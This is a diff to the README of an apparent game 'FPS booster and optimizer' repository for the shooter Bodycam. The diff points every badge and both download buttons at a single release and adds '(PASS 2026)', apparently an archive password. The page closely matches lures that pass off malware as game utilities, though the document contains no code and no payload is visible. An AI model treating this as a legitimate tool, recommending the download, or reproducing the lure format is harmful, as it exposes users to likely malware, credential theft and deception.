@@ -1,9 +1,9 @@
 # Bodycam FPS Booster & Performance Optimizer 2026
 
-[![Platform](https://img.shields.io/badge/Platform-Windows%2010%2F11%20(64--bit)-brightgreen.svg)]()
-[![Engine](https://img.shields.io/badge/Engine-Unreal%20Engine%205-blue.svg)]()
-[![Version](https://img.shields.io/badge/Version-v2.4.1%20(2026)-orange.svg)]()
-[![Status](https://img.shields.io/badge/Status-Working%202026-success.svg)]()
+[![Platform](https://img.shields.io/badge/Platform-Windows%2010%2F11%20(64--bit)-brightgreen.svg)](https://github.com/tomlopezeng2005i7/Bodycam-FPS-Booster-Optimizer-2026/releases/tag/v2.4.1)
+[![Engine](https://img.shields.io/badge/Engine-Unreal%20Engine%205-blue.svg)](https://github.com/tomlopezeng2005i7/Bodycam-FPS-Booster-Optimizer-2026/releases/tag/v2.4.1)
+[![Version](https://img.shields.io/badge/Version-v2.4.1%20(2026)-orange.svg)](https://github.com/tomlopezeng2005i7/Bodycam-FPS-Booster-Optimizer-2026/releases/tag/v2.4.1)
+[![Status](https://img.shields.io/badge/Status-Working%202026-success.svg)](https://github.com/tomlopezeng2005i7/Bodycam-FPS-Booster-Optimizer-2026/releases/tag/v2.4.1)
 
 Welcome to the **Bodycam FPS Booster & Performance Optimizer 2026** repository. **Bodycam** is an ultra-realistic multiplayer first-person shooter powered by the revolutionary Unreal Engine 5. While its photorealistic visuals and camera immersion set a new standard for gaming, high-end rendering features like Lumen Global Illumination, Nanite Geometry, and Virtual Shadow Maps can cause severe frame drops, 1% low stuttering, and input lag on mid-tier and high-end hardware alike.
 
@@ -13,7 +13,7 @@ This open performance optimization toolkit is engineered specifically to elimina
 
 <img width="1280" height="720" alt="Image" src="https://github.com/user-attachments/assets/d64e7559-4689-4985-bd80-8d177d3aee2a" />
 
-### [📥 Download Bodycam FPS Booster & Optimizer 2026](https://github.com)
+### [📥 Download Bodycam FPS Booster & Optimizer 2026](https://github.com/tomlopezeng2005i7/Bodycam-FPS-Booster-Optimizer-2026/releases/tag/v2.4.1)  (PASS 2026)
 *(Click above to get the latest release build)*
 
 ---
@@ -82,4 +82,4 @@ Yes! The optimizer includes an automated aspect ratio patch that fixes field of 
 
 ---
 
-### [📥 Download Latest Version (Mirror)](https://github.com)
+### [📥 Download Latest Version (Mirror)](https://github.com/tomlopezeng2005i7/Bodycam-FPS-Booster-Optimizer-2026/releases/tag/v2.4.1)  (PASS 2026)
